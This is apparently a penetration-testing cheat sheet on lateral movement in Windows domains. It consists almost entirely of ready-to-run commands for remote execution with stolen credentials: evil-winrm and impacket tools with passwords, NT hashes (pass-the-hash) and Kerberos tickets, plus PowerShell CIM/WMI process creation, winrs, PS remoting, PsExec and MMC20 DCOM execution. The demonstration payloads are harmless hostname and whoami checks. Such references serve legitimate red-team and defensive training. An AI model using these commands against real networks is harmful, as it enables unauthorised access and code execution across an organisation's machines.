# Lateral movement checks

Match access to the open service: WMI/DCOM 135 · WinRM 5985/5986 · SMB exec 445 + admin + usable share. Test identity first (authentication ≠ command execution).

## Password or NT hash
```bash
evil-winrm -i <IP> -u <USER> -p '<PW>'
impacket-wmiexec <DOMAIN.TLD>/<USER>:<PW>@<IP>
evil-winrm -i <IP> -u <USER> -H <NT>
impacket-wmiexec -hashes :<NT> <DOMAIN.TLD>/<USER>@<IP>
```
- Pass the Hash needs an NT hash + an NTLM service. NetNTLMv2 is not passable.

## Kerberos ticket
```bash
impacket-getTGT <DOMAIN.TLD>/<USER> -hashes :<NT>
export KRB5CCNAME=<USER>.ccache
impacket-psexec -k -no-pass <DOMAIN.TLD>/<USER>@<FQDN>
```
- Keep the cache tied to its account. TGS is SPN-specific: failure → FQDN, SPN, DNS, clock.

## Direct WMI (PowerShell)
```powershell
$password = ConvertTo-SecureString '<PW>' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $options
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'cmd /c hostname'}
```

## Windows-side alternatives
WinRS / PS remoting → WinRM. PsExec → SMB + service-control access.
```cmd
winrs -r:<FQDN> -u:<DOMAIN>\<USER> -p:<PW> "cmd /c hostname & whoami"
```
```powershell
$password = ConvertTo-SecureString '<PW>' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $password)
$session = New-PSSession -ComputerName <FQDN> -Credential $credential
Enter-PSSession $session
```
```powershell
.\PsExec64.exe \\<FQDN> -u <DOMAIN>\<USER> -p <PW> cmd
```
DCOM/MMC (local admin + RPC; process may run in session 0 → use a file-output proof):
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1', '<FQDN>'))
$dcom.Document.ActiveView.ExecuteShellCommand('cmd', $null, '/c hostname > C:\Windows\Temp\dcom-check.txt', '7')
```
